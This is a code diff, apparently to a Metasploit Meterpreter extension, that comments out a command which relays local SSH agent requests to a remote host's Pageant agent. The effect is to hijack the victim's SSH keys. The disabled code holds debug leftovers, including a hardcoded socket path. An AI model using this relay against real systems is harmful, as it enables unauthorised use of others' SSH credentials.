@@ -34,54 +34,54 @@ class Console::CommandDispatcher::PageantJacker
   #
   def commands
     {
-      "start_pageant_forwarding" => "Create a local socket and forward all requests to the remote Pageant",
+      #"start_pageant_forwarding" => "Create a local socket and forward all requests to the remote Pageant",
     }
   end
 
-  def cmd_start_pageant_forwarding(*args) 
-    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
-    sockpath = "/tmp/parp"
-    ::File.delete sockpath
-    if ::File.exists?(sockpath)
-        print_line("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
-        return
-    end
+#  def cmd_start_pageant_forwarding(*args) 
+#    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+#    sockpath = "/tmp/parp"
+#    ::File.delete sockpath
+#    if ::File.exists?(sockpath)
+#        print_line("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
+#        return
+#    end
+#
+#    ::UNIXServer.open(sockpath) {|serv|
+#      print_line("Launched listening socket on #{sockpath}.")
+#      print_line("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
+#      print_line("Now use any tool normally (e.g. ssh-add)")
+#     
+#      loop { 
+#        s = serv.accept
+#        loop {
+#          socket_request_data = s.recvfrom(8192)
+#          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
+#          
+#          #puts socket_request_data.first.inspect
+#          #puts socket_request_data.first.unpack('NCH*')
+#
+#          #puts 'Request'
+#          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
+#            
+#          if !response_data.nil?
+#            #puts "Response Data\n"
+#            #resp = response_data.unpack('NCH*')
+#            #puts "resp size #{resp[0]} resp type: #{resp[1]} actual_size #{resp[2].size+5}"
+#            #puts "resp #{resp[2].unpack('H*').first}"
+#            s.send response_data,0
+#          end
+#        }
+#      }
+#    }
 
-    ::UNIXServer.open(sockpath) {|serv|
-      print_line("Launched listening socket on #{sockpath}.")
-      print_line("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
-      print_line("Now use any tool normally (e.g. ssh-add)")
-     
-      loop { 
-        s = serv.accept
-        loop {
-          socket_request_data = s.recvfrom(8192)
-          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
-          
-          #puts socket_request_data.first.inspect
-          #puts socket_request_data.first.unpack('NCH*')
-
-          #puts 'Request'
-          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
-            
-          if !response_data.nil?
-            #puts "Response Data\n"
-            #resp = response_data.unpack('NCH*')
-            #puts "resp size #{resp[0]} resp type: #{resp[1]} actual_size #{resp[2].size+5}"
-            #puts "resp #{resp[2].unpack('H*').first}"
-            s.send response_data,0
-          end
-        }
-      }
-    }
-
-    if ::File.exists?(sockpath)
-        print_line("Cleaning up; removing #{sockpath}")
-        ::File.delete(sockpath)
-    else
-        print_line("Unable to remove socket #{sockpath}")
-    end
-  end
+#    if ::File.exists?(sockpath)
+#        print_line("Cleaning up; removing #{sockpath}")
+#        ::File.delete(sockpath)
+#    else
+#        print_line("Unable to remove socket #{sockpath}")
+#    end
+#  end
 
 
 #  @@command_opts = Rex::Parser::Arguments.new(
